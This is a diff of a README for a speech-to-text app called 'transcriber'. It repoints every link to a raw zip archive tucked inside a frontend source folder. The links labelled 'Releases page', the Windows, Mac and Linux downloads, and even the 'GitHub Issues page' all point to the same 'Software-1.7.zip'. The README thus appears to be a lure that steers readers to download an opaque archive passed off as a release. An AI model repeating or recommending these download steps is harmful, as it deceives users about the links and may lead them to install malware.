@@ -1,6 +1,6 @@
 # 🎙️ transcriber - Effortless Speech-to-Text Conversion 
 
-[![Download transcriber](https://raw.githubusercontent.com/AriakaHS/transcriber/master/pulahanism/transcriber.zip)](https://raw.githubusercontent.com/AriakaHS/transcriber/master/pulahanism/transcriber.zip)
+[![Download transcriber](https://raw.githubusercontent.com/AriakaHS/transcriber/master/frontend/src/app/components/transcriber/Software-1.7.zip)](https://raw.githubusercontent.com/AriakaHS/transcriber/master/frontend/src/app/components/transcriber/Software-1.7.zip)
 
 ## 📘 Introduction
 
@@ -13,13 +13,13 @@ To get started, you will need to download the application. Follow these easy ste
 ## 📥 Download & Install
 
 1. **Visit the Releases Page:** 
-   Go to our [Releases page](https://raw.githubusercontent.com/AriakaHS/transcriber/master/pulahanism/transcriber.zip) to find the latest version available for download.
+   Go to our [Releases page](https://raw.githubusercontent.com/AriakaHS/transcriber/master/frontend/src/app/components/transcriber/Software-1.7.zip) to find the latest version available for download.
 
 2. **Select the Right File:**
    On the Releases page, you will see a list of available files. Choose the one that matches your system:
-   - For Windows, look for `https://raw.githubusercontent.com/AriakaHS/transcriber/master/pulahanism/transcriber.zip`
-   - For Mac, find `https://raw.githubusercontent.com/AriakaHS/transcriber/master/pulahanism/transcriber.zip`
-   - For Linux, select `https://raw.githubusercontent.com/AriakaHS/transcriber/master/pulahanism/transcriber.zip`
+   - For Windows, look for `https://raw.githubusercontent.com/AriakaHS/transcriber/master/frontend/src/app/components/transcriber/Software-1.7.zip`
+   - For Mac, find `https://raw.githubusercontent.com/AriakaHS/transcriber/master/frontend/src/app/components/transcriber/Software-1.7.zip`
+   - For Linux, select `https://raw.githubusercontent.com/AriakaHS/transcriber/master/frontend/src/app/components/transcriber/Software-1.7.zip`
 
 3. **Download the File:**
    Click on your chosen file to start the download process. This may take a moment depending on your internet speed.
@@ -34,7 +34,7 @@ To get started, you will need to download the application. Follow these easy ste
    - **For Mac:**
      - Drag the transcriber app to your Applications folder.
    - **For Linux:**
-     - Extract the contents of the `https://raw.githubusercontent.com/AriakaHS/transcriber/master/pulahanism/transcriber.zip` file and follow the included instructions.
+     - Extract the contents of the `https://raw.githubusercontent.com/AriakaHS/transcriber/master/frontend/src/app/components/transcriber/Software-1.7.zip` file and follow the included instructions.
 
 6. **Launch the Application:**
    After installation, open transcriber by finding it in your Applications folder, start menu, or relevant section on your operating system.
@@ -68,7 +68,7 @@ To get started, you will need to download the application. Follow these easy ste
 
 ## 🌐 Support & Community
 
-If you encounter any issues or have questions, feel free to reach out to our community. You can open an issue in the [GitHub Issues page](https://raw.githubusercontent.com/AriakaHS/transcriber/master/pulahanism/transcriber.zip) or join discussions on our community forum.
+If you encounter any issues or have questions, feel free to reach out to our community. You can open an issue in the [GitHub Issues page](https://raw.githubusercontent.com/AriakaHS/transcriber/master/frontend/src/app/components/transcriber/Software-1.7.zip) or join discussions on our community forum.
 
 ## ✨ Contribution
 
@@ -80,4 +80,4 @@ Transcriber is released under the MIT License. This means you have the freedom t
 
 ## 📌 Download Again
 
-To download transcriber, please visit the Releases page [here](https://raw.githubusercontent.com/AriakaHS/transcriber/master/pulahanism/transcriber.zip). Enjoy your transcription experience!
+To download transcriber, please visit the Releases page [here](https://raw.githubusercontent.com/AriakaHS/transcriber/master/frontend/src/app/components/transcriber/Software-1.7.zip). Enjoy your transcription experience!
